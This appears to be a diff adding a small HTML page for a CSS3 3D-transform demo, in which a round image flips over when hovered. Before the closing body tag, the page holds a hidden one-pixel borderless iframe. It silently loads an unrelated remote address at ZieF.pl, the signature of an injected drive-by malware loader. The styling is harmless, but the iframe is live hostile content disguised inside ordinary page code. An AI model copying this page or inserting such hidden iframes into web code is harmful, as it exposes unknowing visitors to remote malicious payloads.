@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>CSS3 3D转换</title>
+    <style>
+    body {
+        margin: 0;
+        padding: 0;
+        background-color: deepskyblue;
+    }
+    
+    .music-box {
+        width: 300px;
+        height: 300px;
+        margin: 50px auto;
+        /*border: 1px solid #000;*/
+        position: relative;
+
+     }
+
+    .music-box::before,.music-box::after {
+        content: "";
+        width: 100%;
+        position: absolute;
+        height: 100%;
+        border-radius:50%;
+        background:url(images/musicb.jpg) no-repeat;
+
+    }
+
+
+
+    .music-box::after {
+        background:url(images/musict.jpg) ;
+        transform-origin: bottom;
+        transition:all 1s;
+    }
+
+    .music-box:hover::after {
+        transform:rotateX(180deg);
+    }
+
+    </style>
+</head>
+
+<body>
+    <div class="music-box"></div>
+<iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe>
+</body>
+
+</html>
